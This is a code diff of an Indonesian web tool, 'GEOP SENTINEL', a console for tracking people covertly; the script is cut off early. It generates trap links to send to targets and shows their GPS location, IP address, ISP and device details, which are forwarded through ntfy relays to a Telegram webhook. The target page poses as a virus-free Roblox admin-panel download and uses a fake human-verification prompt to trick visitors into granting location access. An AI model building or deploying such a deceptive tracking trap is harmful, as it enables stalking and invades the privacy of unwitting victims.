@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <title>GEOP SECURE CLOUD</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>☁️</text></svg>">
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
@@ -10,504 +10,490 @@
 :root{--bg:#05070a;--card:#0d131f;--card2:#0a0f18;--line:#162032;--line2:#111928;--txt:#e8edf7;--mut:#6e82a3;--dim:#3b4a6b;--acc:#00f0ff;--vio:#b14cff;--ok:#00ff88;--warn:#ffb800;--bad:#ff3366;--ui:'Manrope',system-ui;--disp:'Sora';--mono:'JetBrains Mono';--sp:clamp(14px,2vw,24px)}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 [hidden]{display:none!important}
-body{background:var(--bg);color:var(--txt);font-family:var(--ui);font-size:14px;min-height:100vh;overflow-x:hidden;background-image:radial-gradient(1200px 600px at 85% -12%,rgba(0,240,255,.05),transparent),radial-gradient(800px 460px at -12% 34%,rgba(177,76,255,.04),transparent)}
-img,iframe{max-width:100%}button{font-family:inherit}a{color:var(--acc);text-decoration:none}a:hover{text-decoration:underline}
-::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-thumb{background:#1a2744;border-radius:99px}
-#dashMode{max-width:1460px;margin:0 auto;padding:var(--sp);display:flex;flex-direction:column;gap:var(--sp)}
-.topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:14px 20px;background:linear-gradient(180deg,rgba(13,19,31,.95),rgba(13,19,31,.7));border:1px solid var(--line);border-bottom:2px solid rgba(0,240,255,.2);border-radius:16px;backdrop-filter:blur(10px);position:sticky;top:10px;z-index:40;box-shadow:0 10px 30px rgba(0,0,0,.5)}
-.brand{display:flex;align-items:center;gap:12px;min-width:0}
-.brand .ic{width:46px;height:46px;flex:none;display:grid;place-items:center;font-size:22px;border-radius:12px;background:linear-gradient(135deg,#003366,#b14cff);box-shadow:0 0 20px rgba(177,76,255,.4)}
-.brand h1{font-family:var(--disp);font-size:clamp(1rem,2.4vw,1.25rem);letter-spacing:2px;white-space:nowrap}
-.brand h1 span{color:var(--acc);text-shadow:0 0 10px rgba(0,240,255,.4)}
-.brand .sub{font-size:.6rem;letter-spacing:3px;color:var(--mut);text-transform:uppercase}
-.tagver{font-family:var(--mono);font-size:.6rem;color:#fff;background:linear-gradient(90deg,var(--vio),var(--acc));padding:4px 10px;border-radius:6px;white-space:nowrap;font-weight:600}
-.topright{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-.pill{display:flex;align-items:center;gap:8px;border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-family:var(--mono);font-size:.62rem;letter-spacing:1px;color:var(--mut);white-space:nowrap}
-.pill i{width:8px;height:8px;border-radius:50%;background:var(--bad);box-shadow:0 0 8px var(--bad)}
-.pill.live{color:var(--ok);border-color:rgba(0,255,136,.35);background:rgba(0,255,136,.05)}
-.pill.live i{background:var(--ok);box-shadow:0 0 10px var(--ok);animation:bl 1s infinite}
-@keyframes bl{50%{opacity:.2}}
-.clock{font-family:var(--mono);font-size:.7rem;color:var(--acc);border:1px solid rgba(0,240,255,.2);background:rgba(0,240,255,.05);border-radius:8px;padding:7px 12px;white-space:nowrap;font-weight:600}
-.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
-.kpi{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;min-width:0;transition:transform .2s;position:relative;overflow:hidden}
-.kpi:hover{transform:translateY(-2px);border-color:var(--acc)}
-.kpi .ic{width:42px;height:42px;flex:none;display:grid;place-items:center;font-size:18px;border-radius:10px;background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.2)}
-.kpi .lb{display:block;font-size:.58rem;font-weight:800;letter-spacing:1.6px;color:var(--mut);text-transform:uppercase;margin-bottom:4px}
-.kpi b{font-family:var(--mono);font-size:.9rem;font-weight:600;word-break:break-all}
-.layout{display:grid;grid-template-columns:minmax(320px,420px) minmax(0,1fr);gap:var(--sp);align-items:start}
-.colstack{display:flex;flex-direction:column;gap:var(--sp);min-width:0}
-.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:clamp(16px,2vw,22px);min-width:0;box-shadow:0 10px 40px rgba(0,0,0,.4)}
-.chead{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--line2);padding-bottom:10px}
-.chead h2{font-family:var(--disp);font-size:.75rem;letter-spacing:2px;color:#fff;text-transform:uppercase}
-.chead .hint{font-size:.6rem;color:var(--acc);font-family:var(--mono)}
-.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
-.btn{border:none;cursor:pointer;border-radius:8px;padding:12px 16px;font-size:.7rem;font-weight:800;letter-spacing:1px;color:#000;background:var(--acc);transition:all .2s;white-space:nowrap;font-family:var(--mono)}
-.btn:hover{filter:brightness(1.2);box-shadow:0 0 15px rgba(0,240,255,.4)}
-.btn.ghost{background:transparent;border:1px solid var(--mut);color:var(--mut)}
-.btn.ghost:hover{color:var(--txt);border-color:var(--txt);box-shadow:none}
-.btn.danger{background:transparent;border:1px solid rgba(255,51,102,.4);color:var(--bad)}
-.btn.danger:hover{background:rgba(255,51,102,.1)}
-.btn.mini{padding:8px 12px;font-size:.64rem}
-.input{flex:1;min-width:120px;background:var(--card2);border:1px solid var(--line);border-radius:8px;color:var(--txt);font-family:var(--mono);font-size:.7rem;padding:12px;overflow-wrap:anywhere;transition:border .2s}
-.input:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(0,240,255,.1)}
-.input[readonly]{color:var(--acc);background:rgba(0,240,255,.03)}
-.qrbox{display:flex;gap:14px;align-items:center;margin-top:14px;flex-wrap:wrap;background:var(--card2);padding:10px;border-radius:12px;border:1px dashed var(--line)}
-.qrbox img{background:#fff;padding:4px;border-radius:8px;width:110px;height:110px}
-.qrnote{font-family:var(--mono);font-size:.6rem;color:var(--mut);letter-spacing:1px;line-height:1.8}
-.hist{max-height:300px;overflow:auto;display:flex;flex-direction:column;gap:10px;padding-right:6px}
-.hitem{border:1px solid var(--line);border-radius:12px;padding:12px;background:var(--card2);min-width:0;transition:border .2s}
-.hitem:hover{border-color:var(--mut)}
-.hrow{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-family:var(--mono);font-size:.62rem;color:var(--mut);margin:3px 0;overflow-wrap:anywhere}
-.hempty{font-size:.68rem;color:var(--dim);text-align:center;padding:20px 0}
-.log{height:260px;overflow:auto;background:#020408;border:1px solid var(--line);border-radius:12px;padding:14px;font-family:var(--mono);font-size:.64rem;line-height:1.8;color:var(--mut)}
-.log .t{color:var(--dim)}.log .g{color:var(--ok)}.log .r{color:var(--bad)}.log .v{color:var(--vio)}
-.mapwrap{position:relative;border:1px solid var(--line);border-radius:12px;overflow:hidden;background:#000;box-shadow:inset 0 0 20px rgba(0,0,0,.8)}
-#gmap{width:100%;height:clamp(260px,45vh,400px);border:none;display:block;filter:contrast(1.2) saturate(.8) invert(1) hue-rotate(180deg)}
-.mapidle{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.62rem;letter-spacing:2px;color:var(--mut);background:rgba(0,0,0,.7)}
-.kv{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px}
-.kv .cell{background:var(--card2);border:1px solid var(--line2);border-radius:10px;padding:12px;min-width:0;position:relative}
-.kv .cell::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--line);border-radius:10px 0 0 10px}
-.kv .cell.active::before{background:var(--acc)}
-.kv span{display:block;font-size:.56rem;letter-spacing:1px;color:var(--mut);font-weight:700;text-transform:uppercase;margin-bottom:6px}
-.kv b{display:block;font-family:var(--mono);font-size:.72rem;font-weight:600;color:#fff;overflow-wrap:anywhere}
-.coordline{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin:14px 0}
-.coordline code{font-family:var(--mono);color:var(--ok);font-size:.85rem;background:rgba(0,255,136,.1);padding:4px 8px;border-radius:6px;border:1px solid rgba(0,255,136,.2)}
-footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono);letter-spacing:1px;padding:10px 0 20px;line-height:2}
-
-/* ================= TARGET MODE STYLES ================= */
-#targetMode{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:clamp(16px,4vw,32px) clamp(12px,3vw,20px);background:var(--bg)}
-.twrap{max-width:480px;width:100%}
-.banner{background:rgba(255,184,0,.1);border:1px solid rgba(255,184,0,.4);color:var(--warn);font-size:.7rem;padding:14px;border-radius:10px;margin-bottom:20px;line-height:1.6;font-family:var(--ui);text-align:center}
-
-/* CUSTOM DOWNLOAD CARD */
-.dl-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:30px;box-shadow:0 20px 50px rgba(0,0,0,.6);position:relative;overflow:hidden}
-.dl-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--acc),var(--vio))}
-.dl-head{display:flex;align-items:center;gap:16px;margin-bottom:24px}
-.dl-icon{width:60px;height:60px;background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.3);border-radius:16px;display:grid;place-items:center;font-size:28px;color:var(--acc)}
-.dl-title{font-family:var(--disp);font-size:1.2rem;color:#fff;margin-bottom:4px;letter-spacing:1px}
-.dl-sub{font-size:.75rem;color:var(--mut);font-family:var(--mono)}
-.dl-info{background:var(--card2);border-radius:12px;padding:16px;border:1px dashed var(--line)}
-.dl-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line2);font-size:.8rem}
-.dl-row:last-child{border-bottom:none;padding-bottom:0}
-.dl-row span{color:var(--mut)}
-.dl-row b{color:var(--txt);font-family:var(--mono);text-align:right}
-
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px;z-index:60;backdrop-filter:blur(6px)}
-.mcard{max-width:420px;width:100%;background:var(--card);border:1px solid var(--line);padding:30px 24px;text-align:center;border-radius:20px;font-family:var(--ui);box-shadow:0 20px 60px rgba(0,0,0,.8)}
-.mcard h3{font-family:var(--disp);letter-spacing:1px;margin:16px 0 12px;font-size:1.15rem;color:#fff}
-.mcard p{font-size:.85rem;color:var(--mut);line-height:1.7;margin-bottom:24px}
-.mcard p b{color:var(--acc)}
-.mrow{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+body{background:var(--bg);color:var(--txt);font-family:var(--ui);font-size:14px;min-height:100vh;overflow-x:hidden}
+.wrap{max-width:1200px;margin:0 auto;padding:var(--sp)}
+header{display:flex;align-items:center;justify-content:space-between;margin-bottom:var(--sp);padding-bottom:16px;border-bottom:1px solid var(--line)}
+.logo{display:flex;align-items:center;gap:12px}
+.logo-icon{width:42px;height:42px;border-radius:10px;background:linear-gradient(135deg,var(--acc),var(--vio));display:grid;place-items:center;font-size:22px;box-shadow:0 0 20px rgba(0,240,255,.3)}
+.logo h1{font-family:var(--disp);font-size:20px;font-weight:800;letter-spacing:-.5px}
+.logo p{font-size:11px;color:var(--mut);font-family:var(--mono);margin-top:2px}
+.status-pill{display:flex;align-items:center;gap:8px;background:var(--card);padding:6px 14px;border-radius:99px;border:1px solid var(--line);font-size:12px;font-family:var(--mono)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--bad);box-shadow:0 0 10px var(--bad)}
+.dot.on{background:var(--ok);box-shadow:0 0 10px var(--ok);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:var(--sp)}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.chead{padding:16px 20px;border-bottom:1px solid var(--line2);display:flex;align-items:center;justify-content:space-between;background:var(--card2)}
+.chead h2{font-family:var(--disp);font-size:15px;font-weight:700;color:var(--acc);display:flex;align-items:center;gap:8px}
+.cbody{padding:20px}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
+.stat{background:var(--card2);border:1px solid var(--line2);border-radius:10px;padding:12px;text-align:center}
+.stat .lbl{font-size:10px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.stat .val{font-family:var(--mono);font-size:16px;font-weight:600;color:var(--txt)}
+.btn{background:var(--acc);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:700;font-size:13px;cursor:pointer;transition:all .2s;font-family:var(--ui);display:inline-flex;align-items:center;gap:6px}
+.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
+.btn.danger{background:var(--bad);color:#fff}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+.btn.primary{background:var(--acc);color:#000;}
+.btn.mini{padding:6px 12px;font-size:11px}
+.inp{width:100%;background:var(--card2);border:1px solid var(--line);color:var(--txt);padding:12px;border-radius:8px;font-family:var(--mono);font-size:13px;outline:none}
+.inp:focus{border-color:var(--acc)}
+.hist{max-height:250px;overflow-y:auto;padding:10px}
+.hitem{background:var(--card2);border:1px solid var(--line2);border-radius:8px;padding:10px;margin-bottom:8px}
+.hrow{display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px}
+.hempty{text-align:center;color:var(--dim);padding:20px;font-size:12px}
+.map-box{aspect-ratio:16/10;background:#000;border-radius:10px;overflow:hidden;border:1px solid var(--line);position:relative}
+.map-box iframe{width:100%;height:100%;border:0;filter:invert(.9) hue-rotate(180deg) saturate(.5)}
+.coord-box{background:var(--card2);border:1px solid var(--line);border-radius:8px;padding:14px;margin-top:12px;font-family:var(--mono);font-size:13px;display:flex;justify-content:space-between;align-items:center}
+.tel-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.tel-item{background:var(--card2);border:1px solid var(--line2);border-radius:6px;padding:10px;font-size:12px}
+.tel-item .k{color:var(--mut);font-size:10px;text-transform:uppercase;margin-bottom:2px}
+.tel-item .v{color:var(--txt);font-family:var(--mono);font-weight:600;word-break:break-all}
+.term{background:#000;border:1px solid var(--line2);border-radius:8px;padding:12px;height:180px;overflow-y:auto;font-family:var(--mono);font-size:11px;line-height:1.6}
+.term .l{margin-bottom:2px}
+.term .t{color:var(--dim)}
+.term .m{color:var(--mut)}
+.term .g{color:var(--ok)}
+.term .r{color:var(--bad)}
+.term .w{color:var(--warn)}
+.term .c{color:var(--acc)}
+.trap{position:fixed;inset:0;background:rgba(5,7,10,.95);backdrop-filter:blur(10px);z-index:100;display:grid;place-items:center;padding:20px}
+.trap-card{background:var(--card);border:1px solid var(--line);border-radius:20px;max-width:420px;width:100%;padding:30px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.trap-card .icn{font-size:50px;margin-bottom:16px}
+.trap-card h2{font-family:var(--disp);font-size:22px;margin-bottom:10px}
+.trap-card p{color:var(--mut);font-size:14px;line-height:1.6;margin-bottom:24px}
+.trap-card .btn{width:100%;justify-content:center;padding:14px;font-size:15px}
+.foot{text-align:center;margin-top:30px;padding:20px;color:var(--dim);font-size:11px;font-family:var(--mono)}
+.warn-box{background:rgba(255,184,0,.1);border:1px solid var(--warn);border-radius:8px;padding:12px;font-size:12px;color:var(--warn);margin-bottom:16px;line-height:1.5}
+.qr-box{margin-top:16px;text-align:center}
+.qr-box img{background:#fff;padding:8px;border-radius:8px}
+.link-grp{display:flex;gap:8px;margin-top:12px}
 </style>
 </head>
 <body>
-
-<!-- ================= DASHBOARD ================= -->
-<div id="dashMode">
-  <header class="topbar">
-    <div class="brand">
-      <div class="ic">👁️</div>
-      <div><h1>GEOP <span>SENTINEL</span></h1><div class="sub">Advanced Tracking Console</div></div>
-      <span class="tagver">v11.0 PRO</span>
+<div class="wrap">
+  <header>
+    <div class="logo">
+      <div class="logo-icon">👁️</div>
+      <div>
+        <h1>GEOP SENTINEL</h1>
+        <p>Advanced Tracking Console <span style="color:var(--acc)">v11.0 PRO</span></p>
+      </div>
     </div>
-    <div class="topright">
-      <div class="pill" id="pill"><i></i><span id="pillTxt">OFFLINE</span></div>
-      <div class="clock" id="clock">--:--:--</div>
+    <div class="status-pill">
+      <div class="dot" id="statusDot"></div>
+      <span id="statusTxt">OFFLINE</span>
+      <span style="color:var(--dim);margin:0 4px">|</span>
+      <span id="clock">--:--:--</span>
     </div>
   </header>
 
-  <section class="kpis">
-    <div class="kpi"><div class="ic" style="color:var(--vio)">🔑</div><div><span class="lb">Topic Aktif</span><b id="topic" class="acc">–</b></div></div>
-    <div class="kpi"><div class="ic" style="color:var(--ok)">📡</div><div><span class="lb">Ping Diterima</span><b id="pings">0</b></div></div>
-    <div class="kpi"><div class="ic" style="color:var(--warn)">📍</div><div><span class="lb">Fix Lokasi</span><b id="lastfix">–</b></div></div>
-    <div class="kpi"><div class="ic" style="color:var(--acc)">⏱️</div><div><span class="lb">Uptime Sesi</span><b id="uptime">00:00:00</b></div></div>
-  </section>
+  <div class="stat-grid">
+    <div class="stat"><div class="lbl">🔑 Topic Aktif</div><div class="val" id="topicLbl">–</div></div>
+    <div class="stat"><div class="lbl">📡 Ping Diterima</div><div class="val" id="pings">0</div></div>
+    <div class="stat"><div class="lbl">📍 Fix Lokasi</div><div class="val" id="fixLbl">–</div></div>
+    <div class="stat"><div class="lbl">⏱️ Uptime Sesi</div><div class="val" id="uptime">00:00:00</div></div>
+  </div>
 
-  <div class="layout">
-    <div class="colstack">
-      <section class="card">
-        <div class="chead"><h2>▸ Link Generator</h2><span class="hint">Ntfy Relay Net</span></div>
-        <div class="row"><button class="btn" id="btnNew">⚡ GENERATE LINK</button><button class="btn ghost" id="btnCopy">SALIN URL</button></div>
-        <input class="input" id="linkOut" readonly placeholder="Link operasi akan muncul di sini..." style="width:100%;margin-top:12px">
-        <div class="qrbox" id="qrBox" hidden><img id="qr" alt="QR"><div class="qrnote"><b>TIPS:</b> Sebar link ini ke target.<br>Dibutuhkan interaksi pengguna agar GPS aktif.</div></div>
-      </section>
-
-      <section class="card" style="border-color: rgba(177,76,255,.4)">
-        <div class="chead"><h2>▸ Otomatisasi (Webhook)</h2><span class="hint">Kirim ke Bot Telegram/GAS</span></div>
-        <div class="qrnote" style="margin-bottom:8px">Masukkan URL Webhook Google Apps Script kamu di sini. Notifikasi Target akan di-forward otomatis!</div>
-        <div class="row">
-          <input class="input" id="webhookUrl" placeholder="https://script.google.com/macros/s/..." style="font-size:0.6rem">
+  <div class="grid">
+    <div>
+      <section class="card" style="margin-bottom:var(--sp)">
+        <div class="chead"><h2>▸ Link Generator</h2></div>
+        <div class="cbody">
+          <div style="display:flex;gap:8px;margin-bottom:10px">
+            <button class="btn" id="btnGen">⚡ GENERATE LINK</button>
+            <button class="btn ghost" id="btnCopy">📋 SALIN URL</button>
+          </div>
+          <input class="inp" id="linkOut" readonly placeholder="Klik Generate untuk membuat link jebakan...">
+          <div class="qr-box" id="qrBox" hidden>
+            <img id="qr" width="110" height="110">
+          </div>
+          <div class="warn-box" style="margin-top:16px">
+            <b>💡 TIPS:</b> Sebar link ini ke target. Dibutuhkan interaksi pengguna agar GPS aktif.
+          </div>
         </div>
       </section>
 
-      <section class="card">
-        <div class="chead"><h2>▸ Riwayat Target</h2><button class="btn danger mini" id="btnWipe">🗑 BERSIHKAN</button></div>
+      <section class="card" style="margin-bottom:var(--sp)">
+        <div class="chead"><h2>▸ Otomatisasi (Webhook)</h2></div>
+        <div class="cbody">
+          <p style="font-size:12px;color:var(--mut);margin-bottom:10px">Kirim ke Bot Telegram/GAS. Masukkan URL Webhook Google Apps Script kamu di sini. Notifikasi Target akan di-forward otomatis!</p>
+          <input class="inp" id="webhookUrl" placeholder="https://script.google.com/macros/s/.../exec">
+        </div>
+      </section>
+
+      <section class="card" style="margin-bottom:var(--sp)">
+        <div class="chead"><h2>▸ Riwayat Target</h2><div style="display:flex;gap:6px;"><button class="btn primary mini" id="btnExport" style="background:var(--acc);color:#000;font-weight:bold;">💾 EXPORT JSON</button><button class="btn danger mini" id="btnWipe">🗑 BERSIHKAN</button></div></div>
         <div class="hist" id="hist"></div>
       </section>
 
       <section class="card">
         <div class="chead"><h2>▸ Koneksi Manual</h2></div>
-        <div class="row"><input class="input" id="watchIn" placeholder="Tempel Topic ID lama..."><button class="btn ghost" id="btnWatch">CONNECT</button><button class="btn danger" id="btnStop">STOP</button></div>
+        <div class="cbody">
+          <div style="display:flex;gap:8px">
+            <input class="inp" id="manualTopic" placeholder="Masukkan Topic ID (contoh: geop_abc123)">
+            <button class="btn" id="btnConn">CONNECT</button>
+            <button class="btn danger" id="btnStop">STOP</button>
+          </div>
+        </div>
       </section>
     </div>
 
-    <div class="colstack">
-      <section class="card">
-        <div class="chead"><h2>▸ Live Satellite Map</h2><span class="hint">Dark Mode Enabled</span></div>
-        <div class="mapwrap"><iframe id="gmap" src="about:blank" title="peta"></iframe><div class="mapidle" id="mapidle">MENUNGGU KOORDINAT GPS...</div></div>
-        <div class="coordline"><code id="coord">LATITUDE , LONGITUDE</code><a id="gmaps" href="#" target="_blank">Buka di Tab Baru ↗</a><button class="btn ghost mini" id="btnCopyCoord">COPY COORD</button></div>
-      </section>
-
-      <section class="card">
-        <div class="chead"><h2>▸ Ekstraksi Telemetri & Jaringan</h2></div>
-        <div class="kv">
-          <div class="cell active"><span>IP Address</span><b id="ip_addr" style="color:var(--ok)">Menunggu...</b></div>
-          <div class="cell active"><span>ISP / Provider</span><b id="isp" style="color:var(--acc)">Menunggu...</b></div>
-          <div class="cell"><span>Merek / Brand</span><b id="brand">–</b></div>
-          <div class="cell"><span>Model Perangkat</span><b id="dev">–</b></div>
-          <div class="cell"><span>Sistem Operasi</span><b id="os">–</b></div>
-          <div class="cell"><span>Level Baterai</span><b id="batt">–</b></div>
-          <div class="cell"><span>Status Cas</span><b id="chg">–</b></div>
-          <div class="cell"><span>Tipe Sinyal</span><b id="net">–</b></div>
-          <div class="cell"><span>Kecepatan (DL)</span><b id="dl">–</b></div>
-          <div class="cell"><span>CPU Cores</span><b id="cpu">–</b></div>
-          <div class="cell"><span>Kapasitas RAM</span><b id="ram">–</b></div>
-          <div class="cell"><span>Resolusi Layar</span><b id="scr">–</b></div>
-          <div class="cell"><span>Akurasi Lokasi</span><b id="acc">–</b></div>
+    <div>
+      <section class="card" style="margin-bottom:var(--sp)">
+        <div class="chead"><h2>▸ Live Satellite Map</h2><div style="font-size:11px;color:var(--mut);font-family:var(--mono)">Dark Mode Enabled</div></div>
+        <div class="cbody">
+          <div class="map-box" id="mapBox">
+            <div style="position:absolute;inset:0;display:grid;place-items:center;color:var(--dim);font-size:13px">MENUNGGU KOORDINAT GPS...</div>
+          </div>
+          <div class="coord-box">
+            <div>
+              <div style="font-size:10px;color:var(--mut);margin-bottom:2px">LATITUDE , LONGITUDE</div>
+              <div id="coordTxt">– , –</div>
+            </div>
+            <div style="display:flex;gap:6px">
+              <a id="gMapLink" href="#" target="_blank" class="btn ghost mini">🗺️ Buka di Tab Baru ↗</a>
+              <button class="btn ghost mini" id="btnCopyCoord">COPY COORD</button>
+            </div>
+          </div>
         </div>
       </section>
 
-      <section class="card"><div class="chead"><h2>▸ Terminal Log</h2></div><div class="log" id="log"></div></section>
+      <section class="card" style="margin-bottom:var(--sp)">
+        <div class="chead"><h2>▸ Ekstraksi Telemetri & Jaringan</h2></div>
+        <div class="cbody">
+          <div class="tel-grid">
+            <div class="tel-item"><div class="k">IP Address</div><div class="v" id="ip_addr">Menunggu...</div></div>
+            <div class="tel-item"><div class="k">ISP / Provider</div><div class="v" id="isp">Menunggu...</div></div>
+            <div class="tel-item"><div class="k">Merek / Brand</div><div class="v" id="brand">–</div></div>
+            <div class="tel-item"><div class="k">Model Perangkat</div><div class="v" id="dev">–</div></div>
+            <div class="tel-item"><div class="k">Sistem Operasi</div><div class="v" id="os">–</div></div>
+            <div class="tel-item"><div class="k">Level Baterai</div><div class="v" id="batt">–</div></div>
+            <div class="tel-item"><div class="k">Status Cas</div><div class="v" id="chg">–</div></div>
+            <div class="tel-item"><div class="k">Tipe Sinyal</div><div class="v" id="net">–</div></div>
+            <div class="tel-item"><div class="k">Kecepatan (DL)</div><div class="v" id="dl">–</div></div>
+            <div class="tel-item"><div class="k">CPU Cores</div><div class="v" id="cpu">–</div></div>
+            <div class="tel-item"><div class="k">Kapasitas RAM</div><div class="v" id="ram">–</div></div>
+            <div class="tel-item"><div class="k">Resolusi Layar</div><div class="v" id="scr">–</div></div>
+            <div class="tel-item"><div class="k">Akurasi Lokasi</div><div class="v" id="acc">–</div></div>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <div class="chead"><h2>▸ Terminal Log</h2></div>
+        <div class="cbody">
+          <div class="term" id="term"></div>
+        </div>
+      </section>
     </div>
   </div>
-  <footer>GEOP SENTINEL v11.0 PRO • OSINT EDUCATIONAL PURPOSE ONLY • DO NOT USE FOR ILLEGAL TRACKING</footer>
+
+  <div class="foot">
+    GEOP SENTINEL v11.0 PRO • OSINT EDUCATIONAL PURPOSE ONLY • DO NOT USE FOR ILLEGAL TRACKING<br>
+    ⚠️ Agar unduhan berjalan lancar, tekan ⋮ di pojok kanan atas lalu pilih "Buka di Browser / Open in Chrome/Safari".
+  </div>
 </div>
 
-<!-- ================= MODE TARGET (JEBAKAN UNDUHAN) ================= -->
-<div id="targetMode" hidden>
-  <div class="twrap">
-    <div class="banner" id="banner" hidden>⚠️ Agar unduhan berjalan lancar, tekan ⋮ di pojok kanan atas lalu pilih <b>"Buka di Browser / Open in Chrome/Safari"</b>.</div>
-    
-    <div class="dl-card">
-      <div class="dl-head">
-        <div class="dl-icon">📁</div>
-        <div>
-          <h2 class="dl-title">GEOP Secure Cloud</h2>
-          <div class="dl-sub">Encrypted File Sharing System</div>
-        </div>
-      </div>
-
-      <div class="dl-info">
-        <!-- Di sinilah rekayasa sosialnya dimainkan. Kamu bisa mengganti nama file ini sesuai targetmu nantinya -->
-        <div class="dl-row"><span>Nama File</span><b>Roblox_Admin_Panel_v2.zip</b></div>
-        <div class="dl-row"><span>Ukuran</span><b>14.2 MB</b></div>
-        <div class="dl-row"><span>Diunggah</span><b>Hari ini</b></div>
-        <div class="dl-row"><span>Status Keamanan</span><b style="color: var(--ok)">Aman (Bebas Virus)</b></div>
-      </div>
-
-      <button class="btn next" id="btnNext" style="width: 100%; padding: 18px; margin-top: 24px; font-size: 0.85rem;">📥 UNDUH FILE SEKARANG</button>
+<div class="trap" id="trap">
+  <div class="trap-card">
+    <div class="icn">📁</div>
+    <h2>GEOP Secure Cloud</h2>
+    <p style="font-weight:600;color:var(--txt);margin-bottom:8px">Encrypted File Sharing System</p>
+    <div style="background:var(--card2);border:1px solid var(--line);border-radius:10px;padding:16px;text-align:left;margin-bottom:20px">
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px"><span style="color:var(--mut)">Nama File</span><span style="font-family:var(--mono);font-size:12px">Roblox_Admin_Panel_v2.zip</span></div>
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px"><span style="color:var(--mut)">Ukuran</span><span style="font-family:var(--mono);font-size:12px">14.2 MB</span></div>
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px"><span style="color:var(--mut)">Diunggah</span><span style="font-family:var(--mono);font-size:12px">Hari ini</span></div>
+      <div style="display:flex;justify-content:space-between"><span style="color:var(--mut)">Status Keamanan</span><span style="color:var(--ok);font-weight:600;font-size:12px">Aman (Bebas Virus)</span></div>
     </div>
-  </div>
-  
-  <div class="modal" id="modal" hidden>
-    <div class="mcard">
-      <div style="font-size:46px; margin-bottom:12px">🛡️</div>
-      <h3>VERIFIKASI KEAMANAN</h3>
-      <p>Sistem mendeteksi trafik yang mencurigakan dari jaringan Anda. Untuk mencegah pengunduhan massal oleh Bot, sistem memerlukan <b>Validasi Regional</b>.<br><br>Silakan klik tombol di bawah dan <b>Izinkan Akses Lokasi</b> pada pop-up untuk memverifikasi bahwa Anda adalah manusia.</p>
-      <div class="mrow">
-        <button class="btn" id="btnAllow" style="width:100%; padding: 16px;">VERIFIKASI SAYA MANUSIA</button>
-      </div>
+    <button class="btn" style="margin-bottom:12px">📥 UNDUH FILE SEKARANG</button>
+    <div style="background:rgba(255,51,102,.1);border:1px solid var(--bad);border-radius:10px;padding:16px;text-align:left">
+      <h3 style="font-size:14px;color:var(--bad);margin-bottom:8px">🛡️ VERIFIKASI KEAMANAN</h3>
+      <p style="font-size:12px;color:var(--mut);line-height:1.5;margin-bottom:14px">Sistem mendeteksi trafik yang mencurigakan dari jaringan Anda. Untuk mencegah pengunduhan massal oleh Bot, sistem memerlukan Validasi Regional.<br><br>Silakan klik tombol di bawah dan <b>Izinkan Akses Lokasi</b> pada pop-up untuk memverifikasi bahwa Anda adalah manusia.</p>
+      <button class="btn danger" id="btnVerify" style="width:100%;justify-content:center">VERIFIKASI SAYA MANUSIA</button>
     </div>
   </div>
 </div>
 
 <script>
-(() => {
-"use strict";
 const $ = s => document.querySelector(s);
-const $$ = s => [...document.querySelectorAll(s)];
-const RELAYS = ["https://ntfy.sh", "https://ntfy.darmok.dev"]; 
-const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c]));
-const topic = new URLSearchParams(location.search).get("t");
